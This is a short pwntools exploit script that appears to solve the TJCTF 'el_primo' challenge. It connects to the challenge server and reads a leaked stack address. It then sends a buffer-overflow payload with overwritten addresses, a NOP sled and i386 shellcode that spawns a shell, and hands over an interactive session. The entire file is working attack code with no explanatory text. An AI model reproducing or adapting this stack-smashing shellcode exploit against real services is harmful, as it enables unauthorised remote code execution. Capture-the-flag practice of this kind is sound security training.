from pwn import *
from string import printable

# p = process("./el_primo")
p = remote("p1.tjctf.org", 8011)

input("debug")

p.recvuntil("hard counter?")

addr = p.recv().split()[-1]

print(addr)

payload = b"".join([bytes(i*4, 'utf-8') for i in printable])

payload = payload[:payload.index(b"bbbb")]

payload = payload.replace(b"0000", p32(int(addr,16) + 48))
payload = payload.replace(b"8888", p32(int(addr,16) + 4))

shellcode = asm(shellcraft.i386.linux.sh())

payload += b'\x90'*100 + shellcode

p.sendline(payload)

p.interactive()